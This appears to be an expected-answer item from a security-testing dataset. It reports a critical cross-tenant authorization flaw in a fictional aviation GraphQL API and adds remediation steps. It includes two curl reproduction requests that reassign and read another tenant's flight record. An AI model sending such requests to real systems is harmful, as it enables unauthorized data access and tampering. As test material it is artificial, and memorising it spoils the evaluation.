# Expected Response

## System
- Domain: Aviation / Flight Operations
- System: AeroOps Flight Management
- Example ID: GQL-0087

## Priority Findings

### Finding 1: Flight Operations Data Escalation via Session Scope Extension (Pattern 10.2)
**Severity:** Critical
**Category:** BOLA / Single-User / Parameter Escalation

**Summary:**
Per §5.0 (Pattern 10.2 — parameter escalation/own session scope extension): The resolver does not enforce ownership boundaries, enabling a single attacker to extend their session scope beyond their own flight records. An attacker from `tenant-5a2c` submitted `updateResource(id: "R-2087", input: {status: "approved", ownerId: "attacker-5a2cce7e"})` against a flight management record belonging to `tenant-ce7e`. In aviation operations, unauthorized mutation of flight records (schedules, maintenance status, crew assignments) poses safety and regulatory risks under ICAO/EASA frameworks.

**Evidence from HAR:**
- Request: `POST https://api.aeroops-flight-mana.example.com/graphql` (2026-04-13T16:22:34Z)
- JWT `x-tenant-id`: `tenant-5a2c`
- Mutation: `updateResource(id: "R-2087", input: {status: "approved", ownerId: "attacker-5a2cce7e"}) { resourceId status }`
- Response `200 OK`; `tenantId: "tenant-ce7e"`, `sensitiveField: "CONFIDENTIAL-5a2cce7e"`, `internalNotes: "Internal data exposed"`
- `x-request-id: req-5a2cce7e`

## Steps to Reproduce

### Step 1 — Session scope extension to flight record (HAR)
```bash
curl -s -X POST https://api.aeroops-flight-mana.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-5a2c" \
  -d '{"query": "mutation { updateResource(id: \"R-2087\", input: {status: \"approved\", ownerId: \"attacker-5a2cce7e\"}) { resourceId status } }"}'
```
**Vulnerable:** Cross-tenant flight record mutated. **Secure:** FORBIDDEN.

### Step 2 — Parameter escalation via getResource
```bash
curl -s -X POST https://api.aeroops-flight-mana.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-5a2c" \
  -d '{"query": "query { getResource(id: \"R-2087\") { resourceId tenantId data { sensitiveField internalNotes } } }"}'
```
**Vulnerable:** Victim flight data exposed.

## Remediation
1. Resolver tenant guard: `WHERE resource_id=$id AND tenant_id=$jwt.tenantId`.
2. Strip `ownerId` from `ResourceInput` — never client-writable.
3. Redis cache key: `resource:{tenantId}:{resourceId}`.
